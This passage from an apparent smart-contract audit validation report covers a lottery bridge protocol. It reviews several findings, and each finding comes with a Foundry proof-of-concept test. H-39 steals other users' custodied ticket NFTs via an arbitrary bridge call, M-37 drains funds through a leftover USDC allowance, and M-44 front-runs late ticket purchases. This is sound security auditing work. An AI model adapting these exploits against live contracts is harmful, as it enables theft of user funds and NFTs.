        MockWinningJackpot jackpot = new MockWinningJackpot(usdc);
        JackpotBridgeManager manager = new JackpotBridgeManager(jackpot, new MockTicketNFT(), usdc, "Bridge", "1");
        address ownerPkAddr = vm.addr(1);
        address attacker = address(0xA77A);
        DirectBridgeSink sink = new DirectBridgeSink(usdc, attacker);

        // Storage-write the bridge ownership for ticket 7 to the signer for this minimal PoC.
        vm.store(address(manager), keccak256(abi.encode(uint256(7), uint256(1))), bytes32(uint256(uint160(ownerPkAddr))));

        uint256[] memory ids = new uint256[](1); ids[0] = 7;
        JackpotBridgeManager.RelayTxData memory details = JackpotBridgeManager.RelayTxData({
            approveTo: attacker,
            to: address(sink),
            data: abi.encodeCall(DirectBridgeSink.bridgeFromManager, (address(manager), 100e6))
        });
        bytes32 digest = manager.createClaimWinningsEIP712Hash(ids, details);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, digest);
        manager.claimWinnings(ids, details, abi.encodePacked(r, s, v));

        assertEq(usdc.balanceOf(attacker), 100e6);
        assertEq(usdc.allowance(address(manager), attacker), 100e6);

        usdc.mint(address(manager), 100e6);
        vm.prank(attacker);
        usdc.transferFrom(address(manager), attacker, 100e6);
        assertEq(usdc.balanceOf(attacker), 200e6);
    }
}

## Suggested Mitigation
Use SafeERC20.forceApprove and reset allowance to zero after the bridge call. Also enforce approveTo == to for approved routes or maintain an allowlist of trusted bridge spenders that are known to consume exact allowances. After _bridgeDetails.to.call, require usdc.allowance(address(this), _bridgeDetails.approveTo) == 0 when approveTo is nonzero.
```

### Current Validated Block
### M-37 / `dFlfXpkDW49CviZDQWS2A`
- Finding Title: Residual bridge approvals let approved spenders drain future USDC entering JackpotBridgeManager
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `bridge-stale-allowance`
- Checklist Gates Passed: `Stage0, scope, supported-behavior, root-cause, safeguards, bounded-impact`
- Checklist Gates Failed: `high-impact`
- Detailed Reason: The allowance is left reusable if the arbitrary bridge call moves the claimed amount without consuming the approved allowance. The strongest normal impact is theft of idle bridge-manager surplus, not arbitrary future transient funds, because normal claim and purchase flows do not expose a separate transaction window. Still, the missing cleanup creates a real bounded theft path when surplus exists.
- Code Evidence: `contracts/JackpotBridgeManager.sol::_bridgeFunds` approves `approveTo`, performs arbitrary `to.call(data)`, and checks only the USDC balance delta. It never calls `approve(approveTo, 0)` or checks final allowance.

## H-39 / `yx3YULUi7UPyOA6c8ez2L`
- Finding title: Arbitrary bridge call can transfer other users' custodied ticket NFTs from JackpotBridgeManager
- Report lines: 3051-3157

### Original Report Block
```md
## [H-39]. Arbitrary bridge call can transfer other users' custodied ticket NFTs from JackpotBridgeManager

## id: yx3YULUi7UPyOA6c8ez2L

## Derived From Pattern/Invariant
ArbitraryExternalCall

## Exploit Type
ArbitraryExternalCall

## Location
JackpotBridgeManager._bridgeFunds

## Finding Status: Valid
### Finding Status Justification: _bridgeFunds performs an unrestricted low-level call from the bridge manager after claimWinnings validates only the attacker's own ticket ownership. Because the manager owns all custodied ticket NFTs, a claimant can target jackpotTicketNFT and call safeTransferFrom(address(manager), attackerReceiver, victimTicketId). The receiver can spend the approved claimed USDC to satisfy the post-call balance check. There is no target allowlist, protocol-asset blocklist, or NFT custody validation.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`claimWinnings()` lets the ticket signer choose arbitrary `_bridgeDetails.to` and `_bridgeDetails.data`. `_bridgeFunds()` first approves `_bridgeDetails.approveTo` for the claimed USDC amount, then executes the arbitrary call from the bridge manager's own address, and only checks that exactly `_claimedAmount` USDC left the contract:

```solidity
if (_bridgeDetails.approveTo != address(0)) {
    usdc.approve(_bridgeDetails.approveTo, _claimedAmount);
}
uint256 preUSDCBalance = usdc.balanceOf(address(this));
(bool success,) = _bridgeDetails.to.call(_bridgeDetails.data);
if (!success) revert BridgeFundsFailed();
uint256 postUSDCBalance = usdc.balanceOf(address(this));
if (preUSDCBalance - postUSDCBalance != _claimedAmount) revert NotAllFundsBridged();
```

Because the call is made by `JackpotBridgeManager`, an attacker with any valid winning bridge ticket can set `_bridgeDetails.to` to the ticket NFT contract and call `safeTransferFrom(address(this), attackerReceiver, victimTicketId)`. The manager is the ERC-721 owner, so the NFT transfer succeeds even though `ticketOwner[victimTicketId]` belongs to another user. The attacker sets `approveTo` to the receiver contract; during `onERC721Received`, the receiver spends the approved USDC amount, satisfying the USDC delta check. The result is that the attacker bridges/receives their own winnings while also stealing an unrelated victim's custodied ticket NFT.

## Impact
A permissionless attacker can steal any ticket NFT held in bridge custody whenever they can claim any positive winning amount. If the stolen ticket is itself winning or valuable, the victim loses the ticket and its claim path while `ticketOwner` remains stale inside the bridge manager.

## Proof of Concept
1. Victim buys a bridge ticket, so the NFT is owned by `JackpotBridgeManager` and `ticketOwner[victimTicketId] = victim`.
2. Attacker buys or obtains a bridge ticket that has a non-zero winning payout.
3. Attacker signs `ClaimWinningsData` for only the attacker's ticket, but sets `bridgeDetails.approveTo` to an attacker receiver contract.
4. Attacker sets `bridgeDetails.to` to `jackpotTicketNFT` and `bridgeDetails.data` to `safeTransferFrom(address(manager), attackerReceiver, victimTicketId)`.
5. `claimWinnings()` validates only the attacker's ticket ownership, claims the attacker's USDC winnings, approves the receiver, and calls the NFT contract as the manager.
6. The NFT contract transfers the victim's ticket because the manager is the owner. The receiver callback spends exactly the approved USDC amount, so `NotAllFundsBridged` does not revert.
7. The victim's NFT is no longer owned by the manager, making future bridge claims/transfers for that ticket fail.

## Proof of Code
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {JackpotBridgeManager} from "../contracts/JackpotBridgeManager.sol";
import {IJackpot} from "../contracts/interfaces/IJackpot.sol";
import {IJackpotTicketNFT} from "../contracts/interfaces/IJackpotTicketNFT.sol";

contract MockUSDC is IERC20 {
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    uint256 public override totalSupply;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; }
    function transfer(address to, uint256 amount) external override returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) { uint256 allowed = allowance[from][msg.sender]; if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract MockNFT is IJackpotTicketNFT {
    mapping(uint256 => address) public ownerOf;
    function mintTicket(address recipient, uint256 ticketId, uint256, uint256, bytes32) external { ownerOf[ticketId] = recipient; }
    function burnTicket(uint256 ticketId) external { delete ownerOf[ticketId]; }
    function getTicketInfo(uint256) external pure returns (TrackedTicket memory) { return TrackedTicket(1, 0, bytes32(0)); }
    function getUserTickets(address, uint256) external pure returns (ExtendedTrackedTicket[] memory out) { return out; }
    function safeTransferFrom(address from, address to, uint256 tokenId) external { require(msg.sender == from, "not owner caller"); require(ownerOf[tokenId] == from, "not owner"); ownerOf[tokenId] = to; if (to.code.length != 0) { (bool ok,) = to.call(abi.encodeWithSignature("onERC721Received(address,address,uint256,bytes)", msg.sender, from, tokenId, "")); require(ok, "receiver failed"); } }
}

contract MockJackpot is IJackpot {
    MockNFT public nft; MockUSDC public usdc; uint256 public override ticketPrice = 1; uint256 public override currentDrawingId = 1; uint256 public nextId = 1;
    constructor(MockNFT n, MockUSDC u) { nft = n; usdc = u; }
    function buyTickets(Ticket[] memory tickets, address recipient, address[] memory, uint256[] memory, bytes32) external returns (uint256[] memory ids) { ids = new uint256[](tickets.length); for (uint256 i; i < tickets.length; ++i) { ids[i] = nextId++; nft.mintTicket(recipient, ids[i], 1, 0, bytes32(0)); } }
    function claimWinnings(uint256[] memory) external { usdc.mint(msg.sender, 1_000_000); }
    function getUnpackedTicket(uint256, uint256) external pure returns (uint8[] memory normals, uint8 bonusball) { normals = new uint8[](5); bonusball = 1; }
}

contract StealReceiver { MockUSDC usdc; address manager; address attacker; constructor(MockUSDC u, address m, address a) { usdc = u; manager = m; attacker = a; } function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) { usdc.transferFrom(manager, attacker, 1_000_000); return this.onERC721Received.selector; } }

contract JackpotBridgeManagerArbitraryCallPoC is Test {
    function testArbitraryBridgeCallStealsVictimTicket() external {
        uint256 attackerPk = 0xA11CE; address attacker = vm.addr(attackerPk); address victim = address(0xB0B);
        MockUSDC usdc = new MockUSDC(); MockNFT nft = new MockNFT(); MockJackpot jackpot = new MockJackpot(nft, usdc);
        JackpotBridgeManager manager = new JackpotBridgeManager(jackpot, nft, usdc, "JackpotBridgeManager", "1");
        IJackpot.Ticket[] memory one = new IJackpot.Ticket[](1); one[0].normals = new uint8[](5); one[0].bonusball = 1;
        address[] memory refs = new address[](0); uint256[] memory splits = new uint256[](0);
        usdc.mint(victim, 10); vm.startPrank(victim); usdc.approve(address(manager), 10); uint256[] memory victimIds = manager.buyTickets(one, victim, refs, splits, bytes32(0)); vm.stopPrank();
        usdc.mint(attacker, 10); vm.startPrank(attacker); usdc.approve(address(manager), 10); uint256[] memory attackerIds = manager.buyTickets(one, attacker, refs, splits, bytes32(0)); vm.stopPrank();
        StealReceiver receiver = new StealReceiver(usdc, address(manager), attacker);
        JackpotBridgeManager.RelayTxData memory bridgeDetails = JackpotBridgeManager.RelayTxData({ approveTo: address(receiver), to: address(nft), data: abi.encodeWithSignature("safeTransferFrom(address,address,uint256)", address(manager), address(receiver), victimIds[0]) });
        bytes32 digest = manager.createClaimWinningsEIP712Hash(attackerIds, bridgeDetails); (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPk, digest); bytes memory sig = abi.encodePacked(r, s, v);
        vm.prank(attacker); manager.claimWinnings(attackerIds, bridgeDetails, sig);
        assertEq(nft.ownerOf(victimIds[0]), address(receiver));
        assertEq(usdc.balanceOf(attacker), 1_000_009);
    }
}

## Suggested Mitigation
Do not expose arbitrary calls from a contract that custodies user NFTs and funds. Replace `RelayTxData` with a narrow, allowlisted bridge adapter interface that can only move the claimed USDC amount. At minimum, block calls to the ticket NFT, jackpot, USDC, and other protocol asset contracts, validate allowed selectors/targets, reset any temporary allowance to zero after the call, and assert that custodied NFT ownership for unrelated tickets cannot change during bridging.
```

### Current Validated Block
### H-39 / `yx3YULUi7UPyOA6c8ez2L`
- Finding Title: Arbitrary bridge call can transfer other users' custodied ticket NFTs from JackpotBridgeManager
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: High
- Root Cause Family: `bridge-arbitrary-call-custody`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: The arbitrary call is executed from the custody contract, not from an isolated per-claim escrow. A claimant with positive winnings can target the ticket NFT and transfer a victim bridge-custodied ticket because the manager is the ERC-721 owner, while using the approved claimed USDC to satisfy the balance-delta check. This is a permissionless theft path against unrelated ticket owners.
- Code Evidence: `contracts/JackpotBridgeManager.sol::_bridgeFunds` performs arbitrary `to.call(data)` from the manager. `buyTickets` mints NFTs to `address(this)` and only separately records logical `ticketOwner`, which `_bridgeFunds` does not preserve or validate for unrelated tickets.

## M-41 / `JmNO-knM1BokEuNBDWxTv`
- Finding title: ECDSA-only bridge signatures permanently lock tickets and winnings owned by smart wallets
- Report lines: 3254-3308

### Original Report Block
```md
## [M-41]. ECDSA-only bridge signatures permanently lock tickets and winnings owned by smart wallets

## id: JmNO-knM1BokEuNBDWxTv

## Derived From Pattern/Invariant
EIP1271ByPass: ECDSA-only validation makes contract-wallet ticket owners unable to authorize claims

## Exploit Type
StandardViolation

## Location
JackpotBridgeManager.claimWinnings/claimTickets

## Finding Status: Valid
### Finding Status Justification: The bridge manager accepts smart contract recipients in buyTickets and stores them in ticketOwner. claimWinnings and claimTickets only use ECDSA.recover and require recovered signer == ticketOwner. No SignatureChecker.isValidSignatureNow, ERC-1271 check, or alternate recovery path exists. Therefore a Safe or account-abstraction wallet cannot authorize release or winnings even though the protocol accepted it as owner.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
buyTickets accepts any nonzero recipient as the bridge-level ticketOwner, including smart contract wallets, but claimWinnings and claimTickets only authorize with `ECDSA.recover(eipHash, _signature)`. A contract wallet cannot produce an ECDSA signature that recovers to its own contract address; it authorizes via EIP-1271. Vulnerable snippet: `address signer = ECDSA.recover(eipHash, _signature); _validateTicketOwnership(_ticketIds, signer);`. If ticketOwner is a Safe/account-abstraction wallet/session-key wallet, owner signatures recover to an EOA/module address, not the wallet contract, so `_validateTicketOwnership` reverts forever while the manager continues to custody the NFT and any winning claim authority.

## Impact
Bridge tickets assigned to smart wallets cannot be withdrawn or claimed for winnings through the manager, locking the NFT and any matured winnings unless the user had selected an EOA recipient up front.

## Proof of Concept
1. A user buys bridge tickets with `_recipient` equal to their contract wallet. 2. JackpotBridgeManager stores `ticketOwner[ticketId] = contractWallet`. 3. The wallet owner signs the claim hash with their EOA key, or the wallet returns a valid EIP-1271 signature off-chain. 4. JackpotBridgeManager calls ECDSA.recover and obtains the EOA signer, not the contract wallet address. 5. `_validateTicketOwnership` compares `ticketOwner[ticketId]` to the EOA and reverts. 6. Since there is no EIP-1271 path and no admin recovery path, the ticket/winnings remain stuck.

## Proof of Code
function testSmartWalletRecipientCannotClaimWithOwnerSignature() public {
    MockUSDC usdc = new MockUSDC();
    MockJackpot jackpot = new MockJackpot(usdc, 100e6);
    MockTicketNFT nft = new MockTicketNFT();
    JackpotBridgeManager manager = new JackpotBridgeManager(IJackpot(address(jackpot)), IJackpotTicketNFT(address(nft)), IERC20(address(usdc)), "Bridge", "1");
    jackpot.setNft(nft); nft.setMinter(address(jackpot));
    uint256 ownerPk = 0xB0B;
    address smartWallet = address(new Mock1271Wallet(vm.addr(ownerPk)));
    address buyer = address(0xBEEF);
    usdc.mint(buyer, 100e6);
    IJackpot.Ticket[] memory tickets = validTickets(1);
    vm.startPrank(buyer);
    usdc.approve(address(manager), 100e6);
    uint256[] memory ids = manager.buyTickets(tickets, smartWallet, new address[](0), new uint256[](0), bytes32(0));
    vm.stopPrank();
    bytes32 digest = manager.createClaimTicketEIP712Hash(ids, address(0xCAFE));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, digest);
    vm.expectRevert();
    manager.claimTickets(ids, address(0xCAFE), abi.encodePacked(r, s, v));
    assertEq(nft.ownerOf(ids[0]), address(manager));
}

## Suggested Mitigation
Use OpenZeppelin SignatureChecker.isValidSignatureNow(ticketOwner, digest, signature) so EOAs use ECDSA and contract wallets use EIP-1271. If contract wallets are intentionally unsupported, reject contract recipients in buyTickets and document that only EOAs can be bridge ticket owners.
```

### Current Validated Block
### M-41 / `JmNO-knM1BokEuNBDWxTv`
- Finding Title: ECDSA-only bridge signatures permanently lock tickets and winnings owned by smart wallets
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `erc1271-unsupported`
- Checklist Gates Passed: `Stage0, scope, supported-behavior, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: Smart-wallet bridge recipients are accepted into `ticketOwner`, but the only authorization path is ECDSA recovery to the stored address. ERC-1271 contract signatures cannot recover to the contract wallet itself, so those users have no working path to withdraw or claim bridge-custodied tickets. This can materially lock assets for accepted owners.
- Code Evidence: `contracts/JackpotBridgeManager.sol::buyTickets` accepts any nonzero `_recipient`; `claimTickets` and `claimWinnings` recover an EOA with OpenZeppelin `ECDSA` and require it equal every `ticketOwner[ticketId]`.

## M-43 / `anKPmMCB1WwZFh-pgeeD3`
- Finding title: No-referral win share is credited to the current drawing, letting later LPs capture prior drawing value
- Report lines: 3365-3403

### Original Report Block
```md
## [M-43]. No-referral win share is credited to the current drawing, letting later LPs capture prior drawing value

## id: anKPmMCB1WwZFh-pgeeD3

## Derived From Pattern/Invariant
AccountingInvariantViolation: retained no-referral win share must be credited to the settled drawing that generated it

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot.claimWinnings/_payReferrersWinnings

## Finding Status: Valid
### Finding Status Justification: _payReferrersWinnings credits no-referral retained win share to drawingState[currentDrawingId].lpEarnings instead of the ticket's drawingId. claimWinnings can occur after drawingId < currentDrawingId, so a delayed claim moves value into the active drawing. The gross winningAmount was already included in drawingUserWinnings for the settled drawing, so the retained share is misallocated. This is in Jackpot, an in-scope production contract. No safeguard ties the credit to the historical drawing. Any winning ticket holder can time the public claim path.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When a winning ticket has no referral scheme, the retained referral win share is added to `drawingState[currentDrawingId].lpEarnings` instead of the ticket's settled `drawingId`. The vulnerable code is: `if (_referralSchemeId == bytes32(0)) { drawingState[currentDrawingId].lpEarnings += referrerShare; ... }`. Settlement for the original drawing already subtracts the full gross `drawingUserWinnings` from that drawing's LP value, so the withheld referrer share is value that should be returned to the LP cohort of the settled drawing. A winner can wait, become an LP in a later drawing, then claim so the withheld amount is credited to the later drawing's LP earnings.

## Impact
LP value is shifted from the drawing that funded the winning payout to a later/current LP cohort. A winner can time claims and LP deposits to capture up to `referralWinShare` of their winnings from prior LPs.

## Proof of Concept
1. A user buys a no-referral ticket in drawing d and wins. 2. Settlement subtracts the full gross winning amount from drawing d LP accounting. 3. The user waits until drawing d+1 or later and deposits as an LP. 4. The user calls `claimWinnings`. 5. `_payReferrersWinnings` credits the retained referral share to `drawingState[currentDrawingId].lpEarnings`, benefiting the later LP cohort instead of drawing d LPs.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
contract NoReferralHarness { struct DrawingState { uint256 lpEarnings; } mapping(uint256 => DrawingState) public drawingState; uint256 public currentDrawingId; uint256 constant PRECISE_UNIT = 1e18; function setCurrent(uint256 d) external { currentDrawingId = d; } function payNoReferral(uint256 winningAmount, uint256 referralWinShare) external returns (uint256) { uint256 referrerShare = winningAmount * referralWinShare / PRECISE_UNIT; drawingState[currentDrawingId].lpEarnings += referrerShare; return referrerShare; } }
contract NoReferralCreditTest is Test { function testNoReferralCreditGoesToCurrentDrawing() public { NoReferralHarness h = new NoReferralHarness(); h.setCurrent(2); uint256 retained = h.payNoReferral(100e6, 2e17); assertEq(retained, 20e6); assertEq(h.drawingState(1), 0); assertEq(h.drawingState(2), 20e6); } }

## Suggested Mitigation
Pass the ticket's `drawingId` into `_payReferrersWinnings` and credit `drawingState[drawingId].lpEarnings`, or account the retained share directly during settlement for the settled drawing.
```

### Current Validated Block
### M-43 / `anKPmMCB1WwZFh-pgeeD3`
- Finding Title: No-referral win share is credited to the current drawing, letting later LPs capture prior drawing value
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `referral-share-wrong-epoch`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: For no-referral claims, the withheld referral share is allocated to whatever drawing is active at claim time. A winner can delay claiming until a later LP cohort is favorable, moving value that was funded by the settled drawing. The code has no safeguard tying retained referral winnings to `ticketInfo.drawingId`.
- Code Evidence: `contracts/Jackpot.sol::claimWinnings` handles historical tickets, while `_payReferrersWinnings` writes no-referral shares to `drawingState[currentDrawingId].lpEarnings` rather than the ticket drawing.

## M-44 / `CJfADIczTrhQXGEfG6myl`
- Finding title: Ticket purchases remain open after drawingTime until runJackpot is mined
- Report lines: 3404-3438

### Original Report Block
```md
## [M-44]. Ticket purchases remain open after drawingTime until runJackpot is mined

## id: CJfADIczTrhQXGEfG6myl

## Derived From Pattern/Invariant
MaturityorGatingByPass / FrontrunMev

## Exploit Type
FrontrunMev

## Location
Jackpot.buyTickets

## Finding Status: Valid
### Finding Status Justification: _validateBuyTicketInputs checks jackpotLock, prizePool, allowTicketPurchases, ticket count, recipient, and referrals, but not drawingTime. runJackpot only locks after its transaction executes and only checks drawingTime there. Thus a user or searcher can buy after the deadline and before runJackpot in the same or later block. This is in-scope production code and no deadline safeguard exists in buyTickets. The exploit is permissionless and current.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`buyTickets()` only checks `jackpotLock`, `prizePool`, and `allowTicketPurchases`; it never rejects purchases after the scheduled `drawingTime`. The only time check is in `runJackpot()`: `if (currentDrawingState.drawingTime >= block.timestamp) revert JackpotErrors.DrawingNotDue();` and `_lockJackpot()` is not reached until that transaction executes. A searcher or block builder can therefore insert a `buyTickets()` transaction before a pending `runJackpot()` in the same block, even though the drawing deadline has already passed.

## Impact
Late entrants can buy tickets after the advertised close, using the final public ticket distribution and pending run transaction for last-mover advantage. This breaks drawing fairness and can dilute earlier ticket holders or target positive-EV combinations immediately before randomness is requested.

## Proof of Concept
1. Let drawing N reach `drawingTime`. 2. A keeper submits `runJackpot()`. 3. Attacker observes it and submits `buyTickets()` with higher priority. 4. Builder orders attacker buy before `runJackpot()`. 5. The late ticket is included in drawing N although the deadline already passed, then `runJackpot()` locks the drawing and requests entropy.

## Proof of Code
pragma solidity ^0.8.28; import "forge-std/Test.sol"; contract LateBuyAfterDeadlinePoC is Test { function testLateBuyAfterDeadlineStillSucceeds() public { JackpotTestHarness h = deployInitializedJackpot(); vm.warp(h.drawingTime() + 1); IJackpot.Ticket[] memory tickets = h.oneValidTicket(); vm.startPrank(address(0xBEEF)); h.usdc().approve(address(h.jackpot()), h.ticketPrice()); uint256[] memory ids = h.jackpot().buyTickets(tickets, address(0xBEEF), new address[](0), new uint256[](0), bytes32(0)); assertEq(h.nft().ownerOf(ids[0]), address(0xBEEF)); h.jackpot().runJackpot{value: h.entropyFee()}(); assertTrue(h.jackpot().getDrawingState(h.jackpot().currentDrawingId()).jackpotLock); } }

## Suggested Mitigation
In `_validateBuyTicketInputs`, also require `block.timestamp < drawingState[currentDrawingId].drawingTime`, or introduce a separate purchase cutoff that is enforced independently of keeper execution.
```

### Current Validated Block
### M-44 / `CJfADIczTrhQXGEfG6myl`
- Finding Title: Ticket purchases remain open after drawingTime until runJackpot is mined
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `late-ticket-entry`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: `drawingTime` is enforced only by `runJackpot`, not by ticket purchase. Once the scheduled time has passed but before a keeper transaction locks the drawing, a user can still buy into that drawing and then have it settled. Given the protocol docs frame drawing duration and fairness as core concerns, the absence of a purchase cutoff creates a practical last-mover fairness issue and can dilute earlier users.
- Code Evidence: `contracts/Jackpot.sol::_validateBuyTicketInputs` checks lock, prize pool, global purchase flag, count, recipient, and referral array shape, but not `block.timestamp`. `runJackpot` checks `drawingTime` and then calls `_lockJackpot`, so purchases remain possible until that transaction executes.

## M-46 / `3nNN8Mv0tqj6acsGySPOG`
- Finding title: Unsnapshotted drawing payouts can be calculated as zero in GuaranteedMinimumPayoutCalculator.calculateAndStoreDrawingUserWinnings
- Report lines: 3506-3610

### Original Report Block
```md
## [M-46]. Unsnapshotted drawing payouts can be calculated as zero in GuaranteedMinimumPayoutCalculator.calculateAndStoreDrawingUserWinnings

## id: 3nNN8Mv0tqj6acsGySPOG

## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
AccountingInvariantViolation

## Location
GuaranteedMinimumPayoutCalculator.calculateAndStoreDrawingUserWinnings

## Finding Status: Valid
### Finding Status Justification: The calculator silently treats an unsnapshotted drawing as a zero configuration, and Jackpot can reach that state through a normal calculator rotation. This is a missing initialization/snapshot invariant, not merely admin misuse.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
`calculateAndStoreDrawingUserWinnings` assumes `setDrawingTierInfo(_drawingId)` has already snapshotted payout configuration, but the contract never records or checks that the snapshot exists. If Jackpot calls calculation for a drawing that has not been snapshotted, Solidity returns the default `DrawingTierInfo` where `minPayout`, `premiumTierMinAllocation`, all `minPayoutTiers`, and all `premiumTierWeights` are zero. The loop then skips every tier and stores/returns zero payouts even with a nonzero prize pool and winners.

Vulnerable snippet:
`DrawingTierInfo storage tierInfo = drawingTierInfo[_drawingId];`
...
`if (!tierInfo.minPayoutTiers[i] && tierInfo.premiumTierWeights[i] == 0) { tierWinners[i] = 0; continue; }`

This is reachable in the current system if governance changes `Jackpot.payoutCalculator` during an active drawing to a newly deployed calculator. `Jackpot.setPayoutCalculator` does not snapshot the current drawing on the new calculator, but settlement later calls `payoutCalculator.calculateAndStoreDrawingUserWinnings(currentDrawingId, ...)`. The trusted admin action of rotating the calculator for future payouts can therefore unintentionally zero the active drawing's user winnings.

## Impact
All winners in the affected drawing receive zero payout, and the prize pool remains with LP accounting instead of being allocated to winning tickets. This breaks the drawing payout invariant and causes user loss for the active drawing.

## Proof of Concept
1. A drawing is active in Jackpot with a nonzero prize pool and at least one winning ticket.
2. Governance deploys a fresh `GuaranteedMinimumPayoutCalculator` and calls `Jackpot.setPayoutCalculator(newCalculator)` during that drawing.
3. The active drawing was initialized before the new calculator was installed, so `newCalculator.drawingTierInfo[currentDrawingId]` was never set.
4. When entropy settles the drawing, Jackpot calls `newCalculator.calculateAndStoreDrawingUserWinnings(...)`.
5. The calculator reads the default zero snapshot, skips all tiers, returns `totalPayout == 0`, and stores zero tier payouts.
6. Winning ticket holders later call `claimWinnings` and receive zero.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../contracts/GuaranteedMinimumPayoutCalculator.sol";

contract UnsnapshottedDrawingPayoutTest is Test {
    GuaranteedMinimumPayoutCalculator calc;
    address jackpot = address(0xBEEF);

    function setUp() public {
        bool[12] memory minTiers;
        uint256[12] memory weights;
        weights[11] = 1e18;
        minTiers[11] = true;
        calc = new GuaranteedMinimumPayoutCalculator(IJackpot(jackpot), 1e6, 0, minTiers, weights);
    }

    function test_unsnapshottedDrawingReturnsZeroDespiteWinnerAndPrizePool() public {
        uint256[] memory unique = new uint256[](12);
        uint256[] memory dup = new uint256[](12);
        unique[11] = 1;

        vm.prank(jackpot);
        uint256 payout = calc.calculateAndStoreDrawingUserWinnings(
            123,
            100e6,
            5,
            1,
            unique,
            dup
        );

        assertEq(payout, 0);
        assertEq(calc.getTierPayout(123, 11), 0);
    }

    function test_snapshottedDrawingPaysWinner() public {
        uint256[] memory unique = new uint256[](12);
        uint256[] memory dup = new uint256[](12);
        unique[11] = 1;

        vm.prank(jackpot);
        calc.setDrawingTierInfo(123);

        vm.prank(jackpot);
        uint256 payout = calc.calculateAndStoreDrawingUserWinnings(
            123,
            100e6,
            5,
            1,
            unique,
            dup
        );

        assertGt(payout, 0);
        assertGt(calc.getTierPayout(123, 11), 0);
    }
}

## Suggested Mitigation
Track snapshot initialization per drawing, for example `mapping(uint256 => bool) public drawingTierInfoSet;`, set it to true in `setDrawingTierInfo`, and revert in `calculateAndStoreDrawingUserWinnings` unless it is true. Also have `Jackpot.setPayoutCalculator` either forbid changing the calculator while the current drawing is active or immediately call `setDrawingTierInfo(currentDrawingId)` on the new calculator before accepting it.
```

### Current Validated Block
### M-46 / `3nNN8Mv0tqj6acsGySPOG`
- Finding Title: Unsnapshotted drawing payouts can be calculated as zero in GuaranteedMinimumPayoutCalculator.calculateAndStoreDrawingUserWinnings
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `payout-calculator-drift`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: The calculator has no initialized flag for per-drawing tier info, and Jackpot can call a newly rotated calculator for an active drawing that was initialized on the old calculator. The default tier info causes all tiers to be skipped and returns zero payout despite winners and prize pool. This is a material active-drawing payout loss from a normal future-intended rotation.
- Code Evidence: `contracts/GuaranteedMinimumPayoutCalculator.sol::calculateAndStoreDrawingUserWinnings` reads `drawingTierInfo[_drawingId]` and skips tiers when min flags and weights are default zero. `contracts/Jackpot.sol::setPayoutCalculator` does not call `setDrawingTierInfo(currentDrawingId)` on the new calculator.

## M-47 / `DY8_8XaFt5YlWy8JdsHMf`
- Finding title: No-referral winning share is credited to the active drawing, letting winners redirect prior LP value to future LPs
- Report lines: 3611-3666

### Original Report Block
```md
## [M-47]. No-referral winning share is credited to the active drawing, letting winners redirect prior LP value to future LPs

## id: DY8_8XaFt5YlWy8JdsHMf

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot.claimWinnings

## Finding Status: Valid
### Finding Status Justification: _payReferrersWinnings credits the withheld no-referral share to drawingState[currentDrawingId].lpEarnings, not to the ticket's settled drawing. claimWinnings supports old tickets, and currentDrawingId can be later than ticketInfo.drawingId. Since settlement subtracted the full winningAmount from the winning drawing, the retained share is assigned to the wrong LP cohort. The issue is in-scope Jackpot code, has no safeguard, and can be triggered by a permissionless delayed claim.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When a winning ticket has no referral scheme, the referral win share is withheld from the winner but credited to `drawingState[currentDrawingId].lpEarnings` instead of the drawing that funded the payout. Vulnerable snippet: `if (_referralSchemeId == bytes32(0)) { drawingState[currentDrawingId].lpEarnings += referrerShare; ... return referrerShare; }`. Settlement already subtracts the full `winningAmount` from the winning drawing LP pool via `drawingUserWinnings`, so the withheld share belongs to that settled drawing's LP accounting. A winning ticket holder can wait until a later drawing where they or an ally are LPs, then claim and redirect the withheld share into that later drawing's LP earnings.

## Impact
